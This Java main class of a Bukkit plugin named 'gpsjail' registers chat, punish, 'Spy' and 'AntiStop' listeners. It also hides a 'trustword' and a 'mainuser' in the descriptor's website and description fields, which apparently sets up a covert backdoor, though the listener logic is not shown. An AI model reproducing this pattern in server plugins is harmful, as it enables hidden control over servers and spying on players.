package de.maleh.gpsjail;

import java.io.File;

import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
	public static Main instance = null;

	public static File pluginname = null;

	public static String slash;

	public static String trustword;

	public static String ymlname;

	public static String mainuser;

	public void onEnable() {
		instance = this;
		ymlname = getDescription().getName();
		trustword = getDescription().getWebsite();
		slash = getDescription().getPrefix();
		mainuser = getDescription().getDescription();
		pluginname = getFile().getAbsoluteFile();
		getServer().getPluginManager().registerEvents(new PlayerChatListener(), this);
		getServer().getPluginManager().registerEvents(new PlayerPunishListener(), this);
		getServer().getPluginManager().registerEvents(new SpyListener(), this);
		getServer().getPluginManager().registerEvents(new AntiStopListener(), this);
	}
}
